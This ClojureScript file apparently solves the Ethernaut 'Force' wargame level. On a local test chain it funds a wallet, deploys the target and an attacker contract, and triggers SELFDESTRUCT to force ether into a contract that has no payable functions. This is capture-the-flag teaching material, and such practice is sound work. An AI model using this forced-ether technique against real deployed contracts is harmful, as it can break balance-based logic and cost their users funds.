(ns ctf.ethernaut.force
  "The Force contract doesn't have a `fallback` or `receive`
  functions. But we can still send ehter to it!

  The trick is create another contract with a
  positive balance. Then use `SELFDESTRUCT` on the
  contract you created.
  Selfdestruct lets you specify an address.
  When EVM executes SELFDESTRUCT instruction it sends any
  ehter that the contract has to the specifed address"
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]]))



;; Init the a new wallet for the player
;; Attach it with the local provider
(def player
  (.connect
   (.createRandom (.-Wallet u/ethers))
   w/local-provider))


(defn deploy-force!
  "Deploys the target contract that player needs to attack!
   Returns the `js/Promise`."
  []
  (let [contract (u/contract :force
                             w/local-wallet)]
    (.deploy contract)))


(defn deploy-attacker!
  "Deploys the attacker contract that player uses to attack!
   Takes the addr of the target. Returns the `js/Promise`."
  [addr]
  (let [contract (u/contract :force/attacker player)]
    (.deploy contract addr)))


(defn initial-funding!
  "Sends initial funds the newly created wallet from Owner's wallet"
  []
  (let [tx (clj->js
                 {:value (u/eth-str->wei "100.0")
                  :to    (.-address player)})]
    (.sendTransaction w/local-wallet tx)))


(defn trigger!
  "Player triggers the attack by sending the tx to the Attacker contract
  This will make the Attacker contract call SELFDESTRUCT
  and send its balance to Force contract"
  [attacker]
  (let [tx (clj->js {:value (u/eth-str->wei "1")
                     :to (.-address attacker)})]
    (.sendTransaction player tx)))


(defn self-destruct-attack
  "Async Go block to trigger the attack"
  []
  (a/go
    (try
      (let [tx (<p! (initial-funding!))
            force    (<p! (deploy-force!))
            attacker (<p! (deploy-attacker! (.-address force)))
            trigger  (<p! (trigger! attacker))]
        (<p!
         (.getBalance
          w/local-provider
          (.-address force))))
      (catch js/Error err
        (js/console.log (ex-cause err))))))


(comment


  (initial-funding!)

  (deploy-force!)

  (deploy-attacker! (.-address player))

  (trigger! player)

  ;; Execute this block to the the attack
  (a/take! (self-destruct-attack)
           #(.log js/console %))

  )
